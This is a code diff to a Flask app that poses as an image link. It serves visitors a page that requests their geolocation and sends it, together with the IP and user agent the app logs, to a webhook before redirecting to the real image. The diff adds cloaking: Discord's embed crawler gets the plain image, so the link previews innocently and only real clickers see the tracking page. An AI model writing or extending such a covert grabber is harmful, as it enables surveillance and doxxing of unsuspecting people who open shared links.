@@ -4,6 +4,7 @@ import requests
 import datetime
 import json
 import urllib.parse
+import re
 
 app = Flask(__name__)
 
@@ -17,6 +18,22 @@ def fetch_image():
         return r.content, r.headers.get('Content-Type', 'image/jpeg')
     except:
         return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'
+
+def is_discord_bot(user_agent):
+    """Check if the request is from Discord's embed crawler"""
+    if not user_agent:
+        return False
+    ua_lower = user_agent.lower()
+    discord_patterns = [
+        'discordbot',
+        'discord',
+        'mozilla/5.0 (compatible; discordbot',
+        'mediapartners-google'  # sometimes Discord uses this
+    ]
+    for pattern in discord_patterns:
+        if pattern in ua_lower:
+            return True
+    return False
 
 # HTML + JS that asks for geolocation and sends to webhook, then redirects to image
 GEO_HTML = """
@@ -45,7 +62,7 @@ GEO_HTML = """
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             }).catch(e => console.log(e));
-            // Then redirect to the actual image
+            // Then redirect to the actual image with geo=1
             window.location.href = "{{ image_url }}?geo=1";
         }
         function errorLocation(err) {
@@ -73,7 +90,18 @@ GEO_HTML = """
 
 @app.route('/api/image', methods=['GET'])
 def serve_image():
-    # If we have ?geo=1 or ?geo=0, just serve the image (no more HTML)
+    user_agent = request.headers.get('User-Agent', '')
+    
+    # If it's a Discord bot, serve the image directly (no location prompt)
+    if is_discord_bot(user_agent):
+        image_data, content_type = fetch_image()
+        response = make_response(image_data)
+        response.headers.set('Content-Type', content_type)
+        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
+        response.headers.set('Pragma', 'no-cache')
+        return response
+    
+    # If we have ?geo=1 or ?geo=0, just serve the image (after location prompt)
     if request.args.get('geo') is not None:
         image_data, content_type = fetch_image()
         response = make_response(image_data)
@@ -84,7 +112,6 @@ def serve_image():
 
     # Otherwise, serve the HTML that will ask for location
     ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown')
-    user_agent = request.headers.get('User-Agent', 'Unknown')
     referrer = request.headers.get('Referer', 'No referrer')
     timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
 
